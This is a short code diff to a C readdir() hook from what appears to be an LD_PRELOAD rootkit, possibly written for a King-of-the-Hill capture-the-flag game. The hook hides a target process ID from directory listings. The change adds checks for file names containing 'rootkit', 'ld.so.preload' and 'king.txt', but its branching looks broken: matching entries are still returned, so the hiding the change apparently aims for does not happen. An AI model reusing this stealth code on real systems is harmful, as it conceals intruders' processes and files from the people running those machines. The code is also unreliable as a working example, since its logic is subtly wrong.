@@ -126,10 +126,16 @@ struct dirent *readdir(DIR *dirp) {
 
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
-        // Hide processes with the specified PID
-        if (entry->d_type == DT_DIR && atoi(entry->d_name) == target_pid) {
-            continue; // Skip this entry
-        }
-        return entry; // Return non-hidden entries
+          if (strstr(entry->d_name, "rootkit") == NULL &&
+            strstr(entry->d_name, "ld.so.preload") == NULL &&
+            strstr(entry->d_name, "king.txt") == NULL) {
+            return entry;
+          } else {
+            // Hide processes with the specified PID
+            if (entry->d_type == DT_DIR && atoi(entry->d_name) == target_pid) {
+                continue; // Skip this entry
+            }
+            return entry; // Return non-hidden entries
+          }
     }
     return NULL;}
